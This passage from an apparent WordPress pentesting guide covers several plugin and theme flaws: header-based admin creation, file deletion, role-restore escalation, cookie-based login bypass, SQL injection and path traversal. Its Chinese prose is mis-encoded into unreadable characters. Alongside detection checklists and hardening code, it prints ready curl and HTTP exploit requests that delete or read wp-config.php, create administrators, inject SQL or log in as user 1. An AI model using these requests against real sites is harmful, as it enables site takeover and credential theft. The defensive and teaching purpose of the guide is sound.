POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ä¸ºä»€ä¹ˆå¯è¡Œ

- æ’ä»¶å°†å®¢æˆ·ç«¯å¯æ§çš„ header æ˜ å°„åˆ°è®¤è¯çŠ¶æ€å¹¶è·³è¿‡èƒ½åŠ›æ£€æŸ¥ã€‚
- WordPress core æœŸæœ›æ­¤è·¯ç”±éœ€è¦ `create_users` èƒ½åŠ›ï¼›è¯¥æ’ä»¶é€šè¿‡ç›´æ¥ä» header è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡æ¥ç»•è¿‡è¯¥æ£€æŸ¥ã€‚

é¢„æœŸæˆåŠŸæŒ‡ç¤º

- è¿”å› HTTP 201ï¼Œä¸” JSON æ­£æ–‡æè¿°å·²åˆ›å»ºçš„ç”¨æˆ·ã€‚
- åœ¨ `wp-admin/users.php` ä¸­å¯è§ä¸€ä¸ªæ–°çš„ admin ç”¨æˆ·ã€‚

æ£€æµ‹æ¸…å•

- Grep æŸ¥æ‰¾ `getallheaders()`ã€`$_SERVER['HTTP_...']`ï¼Œæˆ–ä¼šè¯»å–è‡ªå®šä¹‰ header æ¥è®¾ç½®ç”¨æˆ·ä¸Šä¸‹æ–‡çš„ vendor SDKï¼ˆä¾‹å¦‚ `wp_set_current_user()`ã€`wp_set_auth_cookie()`ï¼‰ã€‚
- å®¡æŸ¥ REST æ³¨å†Œï¼ŒæŸ¥æ‰¾é‚£äº›ç¼ºä¹å¥å£® `permission_callback` æ£€æŸ¥ä¸”ä¾èµ–è¯·æ±‚ header çš„ç‰¹æƒå›è°ƒã€‚
- æŸ¥æ‰¾åœ¨ä»…ç”± header å€¼æ§åˆ¶çš„ REST å¤„ç†ç¨‹åºå†…éƒ¨ä½¿ç”¨æ ¸å¿ƒç”¨æˆ·ç®¡ç†å‡½æ•°ï¼ˆ`wp_insert_user`ã€`wp_create_user`ï¼‰çš„æƒ…å†µã€‚

åŠ å›ºå»ºè®®

- åˆ‡å‹¿ä»å®¢æˆ·ç«¯å¯æ§çš„ header æ¨å¯¼è®¤è¯æˆ–æˆæƒã€‚
- å¦‚æœå¿…é¡»ç”±åå‘ä»£ç†æ³¨å…¥èº«ä»½ï¼Œåº”åœ¨ä»£ç†å¤„ç»ˆæ­¢ä¿¡ä»»å¹¶å‰¥ç¦»å…¥ç«™å‰¯æœ¬ï¼ˆä¾‹å¦‚åœ¨è¾¹ç¼˜å¤„ `unset X-Wcpay-Platform-Checkout-User`ï¼‰ï¼Œç„¶åä¼ é€’ç­¾åä»¤ç‰Œå¹¶åœ¨æœåŠ¡å™¨ç«¯éªŒè¯å®ƒã€‚
- å¯¹äºæ‰§è¡Œç‰¹æƒæ“ä½œçš„ REST è·¯ç”±ï¼Œè¦æ±‚ä½¿ç”¨ `current_user_can()` æ£€æŸ¥å¹¶å®ç°ä¸¥æ ¼çš„ `permission_callback`ï¼ˆä¸è¦ä½¿ç”¨ `__return_true`ï¼‰ã€‚
- ä¼˜å…ˆä½¿ç”¨ç¬¬ä¸€æ–¹è®¤è¯ï¼ˆcookiesã€application passwordsã€OAuthï¼‰ï¼Œè€Œä¸æ˜¯ header â€œæ¨¡æ‹Ÿâ€ã€‚

å‚è€ƒï¼šå‚è§æœ¬é¡µæœ«å°¾çš„é“¾æ¥ï¼Œäº†è§£ä¸€ä¸ªå…¬å¼€æ¡ˆä¾‹å’Œæ›´å¹¿æ³›çš„åˆ†æã€‚

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress ä¸»é¢˜å’Œæ’ä»¶ç»å¸¸é€šè¿‡ `wp_ajax_` å’Œ `wp_ajax_nopriv_` é’©å­æš´éœ² AJAX å¤„ç†ç¨‹åºã€‚å½“ä½¿ç”¨ **_nopriv_** å˜ä½“æ—¶ï¼Œ**å›è°ƒä¼šè¢«æœªè®¤è¯çš„è®¿é—®è€…è®¿é—®åˆ°**ï¼Œå› æ­¤ä»»ä½•æ•æ„Ÿæ“ä½œè¿˜å¿…é¡»é¢å¤–å®ç°ï¼š

1. ä¸€ä¸ª **èƒ½åŠ›æ£€æŸ¥**ï¼ˆä¾‹å¦‚ `current_user_can()` æˆ–è‡³å°‘ `is_user_logged_in()`ï¼‰ï¼Œä»¥åŠ
2. ä¸€ä¸ªé€šè¿‡ `check_ajax_referer()` / `wp_verify_nonce()` éªŒè¯çš„ **CSRF nonce**ï¼Œä»¥åŠ
3. **ä¸¥æ ¼çš„è¾“å…¥å‡€åŒ–/éªŒè¯**ã€‚

Litho å¤šç”¨é€”ä¸»é¢˜ï¼ˆ< 3.1ï¼‰åœ¨ *Remove Font Family* åŠŸèƒ½ä¸­å¿˜è®°äº†è¿™ä¸‰é¡¹æ§åˆ¶ï¼Œæœ€ç»ˆéšä¸»é¢˜å‘å¸ƒäº†å¦‚ä¸‹ä»£ç ï¼ˆå·²ç®€åŒ–ï¼‰ï¼š
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
è¯¥ä»£ç ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

* **Unauthenticated access** â€“ the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** â€“ any visitor can hit the endpoint.
* **No path sanitisation** â€“ the userâ€“controlled `fontfamily` string is concatenated to a filesystem path without filtering, allowing classic `../../` traversal.

#### åˆ©ç”¨

æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€å•ä¸ª HTTP POST è¯·æ±‚åˆ é™¤ä½äº **uploads åŸºç›®å½•ä»¥ä¸‹**ï¼ˆé€šå¸¸ä¸º `<wp-root>/wp-content/uploads/`ï¼‰çš„ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### æ£€æµ‹æ¸…å•

* ä»»ä½•è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿè¾…åŠ©å‡½æ•°ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()` ç­‰ï¼‰çš„ `add_action( 'wp_ajax_nopriv_...')` å›è°ƒã€‚
* æœªç»æ¶ˆæ¯’çš„ç”¨æˆ·è¾“å…¥è¢«æ‹¼æ¥åˆ°è·¯å¾„ä¸­ï¼ˆæŸ¥æ‰¾ `$_POST`, `$_GET`, `$_REQUEST`ï¼‰ã€‚
* ç¼ºå°‘ `check_ajax_referer()` å’Œ `current_user_can()`/`is_user_logged_in()`ã€‚

#### åŠ å›º
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **å§‹ç»ˆ** å°†ä»»ä½•å¯¹ç£ç›˜çš„å†™å…¥/åˆ é™¤æ“ä½œè§†ä¸ºæœ‰æƒé™é£é™©ï¼Œå¹¶è¿›è¡ŒåŒé‡æ£€æŸ¥ï¼š
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

è®¸å¤šæ’ä»¶é€šè¿‡å°†åŸå§‹è§’è‰²ä¿å­˜åœ¨ user meta ä¸­æ¥å®ç°â€œview as roleâ€æˆ–ä¸´æ—¶è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼Œä»¥ä¾¿ç¨åæ¢å¤ã€‚å¦‚æœè¿˜åŸæµç¨‹ä»…ä¾èµ–è¯·æ±‚å‚æ•°ï¼ˆä¾‹å¦‚ `$_REQUEST['reset-for']`ï¼‰å’Œæ’ä»¶ç»´æŠ¤çš„åˆ—è¡¨ï¼Œè€Œæœªåœ¨ç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ æ¥è‡ªç”¨æˆ· meta çš„ä¿å­˜è§’è‰²ä¹‹å‰æ£€æŸ¥ capabilities å’Œæœ‰æ•ˆ nonceï¼Œåˆ™ä¼šå¯¼è‡´ vertical privilege escalationã€‚

åœ¨ Admin and Site Enhancements (ASE) æ’ä»¶ï¼ˆâ‰¤ 7.6.2.1ï¼‰ä¸­å‘ç°äº†ä¸€ä¸ªçœŸå®ç¤ºä¾‹ã€‚é‡ç½®åˆ†æ”¯åŸºäº `reset-for=<username>` æ¢å¤è§’è‰²â€”â€”å¦‚æœè¯¥ç”¨æˆ·åå‡ºç°åœ¨å†…éƒ¨æ•°ç»„ `$options['viewing_admin_as_role_are']` ä¸­â€”â€”ä½†åœ¨ç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ æ¥è‡ªç”¨æˆ· meta `_asenha_view_admin_as_original_roles` çš„ä¿å­˜è§’è‰²ä¹‹å‰ï¼Œæ—¢æ²¡æœ‰è¿›è¡Œ `current_user_can()` æ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œ nonce éªŒè¯ï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ä¸ºä½•å¯è¢«åˆ©ç”¨

- ä¿¡ä»» `$_REQUEST['reset-for']` å’Œä¸€ä¸ªæ’ä»¶é€‰é¡¹ï¼Œè€Œæ²¡æœ‰è¿›è¡ŒæœåŠ¡å™¨ç«¯æˆæƒã€‚
- å¦‚æœæŸç”¨æˆ·ä¹‹å‰åœ¨ `_asenha_view_admin_as_original_roles` ä¸­ä¿å­˜äº†æ›´é«˜çš„æƒé™å¹¶è¢«é™çº§ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡è®¿é—®é‡ç½®è·¯å¾„æ¥æ¢å¤è¿™äº›æƒé™ã€‚
- åœ¨æŸäº›éƒ¨ç½²ä¸­ï¼Œä»»ä½•å·²è®¤è¯ç”¨æˆ·éƒ½å¯ä»¥è§¦å‘é’ˆå¯¹ä»ä¿å­˜åœ¨ `viewing_admin_as_role_are` ä¸­çš„å…¶ä»–ç”¨æˆ·åçš„é‡ç½®ï¼ˆæˆæƒå¤±æ•ˆï¼‰ã€‚

æ”»å‡»å…ˆå†³æ¡ä»¶

- å¯ç”¨äº†è¯¥åŠŸèƒ½çš„æ˜“å—æ”»å‡»çš„æ’ä»¶ç‰ˆæœ¬ã€‚
- ç›®æ ‡è´¦æˆ·åœ¨ç”¨æˆ· meta ä¸­ä¿ç•™äº†å…ˆå‰ä½¿ç”¨ç•™ä¸‹çš„è¿‡æœŸé«˜æƒé™è§’è‰²ã€‚
- ä»»ä½•å·²è®¤è¯çš„ä¼šè¯ï¼›é‡ç½®æµç¨‹ä¸­ç¼ºå°‘ nonce/capabilityã€‚

åˆ©ç”¨ï¼ˆç¤ºä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
åœ¨æ˜“å—æ”»å‡»çš„æ„å»ºä¸Šï¼Œè¿™ä¼šç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ ä¿å­˜çš„åŸå§‹è§’è‰²ï¼ˆä¾‹å¦‚ `administrator`ï¼‰ï¼Œä»è€Œæœ‰æ•ˆæå‡æƒé™ã€‚

Detection checklist

- æŸ¥æ‰¾ä¼šåœ¨ user meta ä¸­æŒä¹…åŒ–â€œåŸå§‹è§’è‰²â€çš„ role-switching åŠŸèƒ½ï¼ˆä¾‹å¦‚ `_asenha_view_admin_as_original_roles`ï¼‰ã€‚
- è¯†åˆ«é‡ç½®/æ¢å¤è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ä¼šï¼š
  - ä» `$_REQUEST` / `$_GET` / `$_POST` è¯»å–ç”¨æˆ·åã€‚
  - é€šè¿‡ `add_role()` / `remove_role()` ä¿®æ”¹è§’è‰²ï¼Œä½†æœªä½¿ç”¨ `current_user_can()` å’Œ `wp_verify_nonce()` / `check_admin_referer()`ã€‚
  - åŸºäºæ’ä»¶é€‰é¡¹æ•°ç»„ï¼ˆä¾‹å¦‚ `viewing_admin_as_role_are`ï¼‰è¿›è¡Œæˆæƒï¼Œè€Œä¸æ˜¯åŸºäºæ‰§è¡Œè€…çš„æƒé™ã€‚

Hardening

- åœ¨æ‰€æœ‰ä¼šæ”¹å˜çŠ¶æ€çš„åˆ†æ”¯ä¸Šå¼ºåˆ¶æ‰§è¡Œæƒé™æ£€æŸ¥ï¼ˆä¾‹å¦‚ `current_user_can('manage_options')` æˆ–æ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼‰ã€‚
- æ‰€æœ‰è§’è‰²/æƒé™æ›´æ”¹éƒ½å¿…é¡»ä½¿ç”¨ nonce å¹¶è¿›è¡ŒéªŒè¯ï¼š`check_admin_referer()` / `wp_verify_nonce()`ã€‚
- ç»ä¸ä¿¡ä»»è¯·æ±‚ä¸­æä¾›çš„ç”¨æˆ·åï¼›åº”åŸºäºå·²è®¤è¯çš„æ‰§è¡Œè€…å’Œæ˜ç¡®ç­–ç•¥åœ¨æœåŠ¡å™¨ç«¯è§£æç›®æ ‡ç”¨æˆ·ã€‚
- åœ¨é…ç½®æ¡£/è§’è‰²æ›´æ–°æ—¶ä½¿â€œåŸå§‹è§’è‰²â€çŠ¶æ€å¤±æ•ˆï¼Œä»¥é¿å…é™ˆæ—§çš„é«˜æƒé™æ¢å¤ï¼š
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- è€ƒè™‘å°½é‡å°‘å­˜å‚¨çŠ¶æ€ï¼Œå¹¶ä¸ºä¸´æ—¶è§’è‰²åˆ‡æ¢ä½¿ç”¨æ—¶é™æ€§ã€capability-guarded tokensã€‚

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

ä¸€äº›æ’ä»¶å°† user-switching helpers ç»‘å®šåˆ°å…¬å…±çš„ `init` hookï¼Œå¹¶ä»å®¢æˆ·ç«¯å¯æ§çš„ cookie æ´¾ç”Ÿèº«ä»½ã€‚å¦‚æœä»£ç åœ¨æœªéªŒè¯ authenticationã€capability å’Œæœ‰æ•ˆ nonce çš„æƒ…å†µä¸‹è°ƒç”¨ `wp_set_auth_cookie()`ï¼Œä»»ä½• unauthenticated è®¿å®¢éƒ½å¯ä»¥å¼ºåˆ¶ä»¥ä»»æ„ç”¨æˆ· ID ç™»å½•ã€‚

å…¸å‹çš„æ˜“å—æ”»å‡»æ¨¡å¼ï¼ˆç®€åŒ–è‡ª Service Finder Bookings â‰¤ 6.1ï¼‰ï¼š
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨

- å…¬å¼€çš„ `init` hook ä½¿è¯¥å¤„ç†ç¨‹åºå¯¹æœªè®¤è¯ç”¨æˆ·å¯è¾¾ï¼ˆæ²¡æœ‰ `is_user_logged_in()` æ£€æŸ¥ï¼‰ã€‚
- èº«ä»½æ¥æºäºå®¢æˆ·ç«¯å¯ä¿®æ”¹çš„ cookieï¼ˆ`original_user_id`ï¼‰ã€‚
- ç›´æ¥è°ƒç”¨ `wp_set_auth_cookie($uid)` ä¼šåœ¨æ²¡æœ‰ä»»ä½• capability/nonce æ£€æŸ¥çš„æƒ…å†µä¸‹å°†è¯·æ±‚è€…ä»¥è¯¥ç”¨æˆ·èº«ä»½ç™»å½•ã€‚

åˆ©ç”¨ï¼ˆæœªè®¤è¯ï¼‰
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many highâ€‘impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

è¿›æ”»æ³¨æ„äº‹é¡¹

- é’ˆå¯¹æ’ä»¶ç‰¹å®šç«¯ç‚¹ä½¿ç”¨å¹²å‡€çš„ payloadï¼š`admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- å…ˆå°è¯•æœªè®¤è¯è·¯å¾„ï¼ˆAJAX `nopriv`, REST with permissive `permission_callback`, public shortcodesï¼‰ã€‚é»˜è®¤ payload å¸¸å¸¸åœ¨ä¸æ··æ·†çš„æƒ…å†µä¸‹å°±èƒ½æˆåŠŸã€‚
- å…¸å‹é«˜å½±å“åœºæ™¯ï¼šprivilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

é˜²å¾¡æ³¨æ„äº‹é¡¹

- ä¸è¦ä¾èµ–é€šç”¨ WAF ç­¾åæ¥ä¿æŠ¤æ’ä»¶ CVEsã€‚åº”åœ¨åº”ç”¨å±‚å®æ–½é’ˆå¯¹æ¼æ´çš„è™šæ‹Ÿè¡¥ä¸ï¼Œæˆ–å°½å¿«æ›´æ–°ã€‚
- åœ¨ä»£ç ä¸­ä¼˜å…ˆä½¿ç”¨æ­£å‘å®‰å…¨æ£€æŸ¥ï¼ˆcapabilities, nonces, strict input validationï¼‰è€Œä¸æ˜¯åŸºäºè´Ÿå‘çš„ regex è¿‡æ»¤ã€‚

## WordPress Protection

### Regular Updates

ç¡®ä¿ WordPressã€plugins å’Œ themes æ˜¯æœ€æ–°çš„ã€‚è¿˜è¦ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
æ­¤å¤–ï¼Œ**ä»…å®‰è£…å¯ä¿¡èµ–çš„ WordPress æ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

- ç§»é™¤é»˜è®¤çš„ **admin** ç”¨æˆ·
- ä½¿ç”¨ **å¼ºå¯†ç ** å’Œ **2FA**
- å®šæœŸ **å®¡æ ¸** ç”¨æˆ· **æƒé™**
- **é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°** ä»¥é˜²æ­¢ Brute Force æ”»å‡»
- é‡å‘½å **`wp-admin.php`** æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸å†…éƒ¨æˆ–ç‰¹å®š IP åœ°å€è®¿é—®ã€‚


### æœªè®¤è¯çš„ SQL Injectionï¼ˆç”±äºéªŒè¯ä¸è¶³ï¼‰ï¼ˆWP Job Portal <= 2.3.2ï¼‰

WP Job Portal æ‹›è˜æ’ä»¶æš´éœ²äº†ä¸€ä¸ª savecategory ä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡æœ€ç»ˆåœ¨ `modules/category/model.php::validateFormData()` ä¸­æ‰§è¡Œä»¥ä¸‹æ˜“å—æ”»å‡»çš„ä»£ç ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** â€“ `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** â€“ no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** â€“ although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### åˆ©ç”¨

1. è·å–ä¸€ä¸ªæ–°çš„ nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. é€šè¿‡æ»¥ç”¨ `parentid` æ³¨å…¥ä»»æ„ SQL:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
å“åº”ä¼šæŠ«éœ²æ³¨å…¥æŸ¥è¯¢çš„ç»“æœæˆ–æ›´æ”¹æ•°æ®åº“ï¼Œä»è€Œè¯æ˜ SQLiã€‚


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

å¦ä¸€ä¸ªä»»åŠ¡ï¼Œ**downloadcustomfile**ï¼Œå…è®¸è®¿é—®è€…é€šè¿‡ path traversal ä¸‹è½½ç£ç›˜ä¸Šçš„ **ä»»æ„æ–‡ä»¶**ã€‚æ˜“å—æ”»å‡»çš„ sink ä½äº `modules/customfield/model.php::downloadCustomUploadedFile()`ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ç”±æ”»å‡»è€…æ§åˆ¶å¹¶åœ¨ **without sanitisation** çš„æƒ…å†µä¸‹è¢«æ‹¼æ¥ã€‚å†æ¬¡ï¼Œå”¯ä¸€çš„é—¨æ§›æ˜¯å¯ä»¥ä» resume é¡µé¢è·å–çš„ **CSRF nonce**ã€‚

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
æœåŠ¡å™¨å“åº”å¹¶è¿”å› `wp-config.php` çš„å†…å®¹ï¼Œleaking DB credentials and auth keysã€‚

## å‚è€ƒèµ„æ–™

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
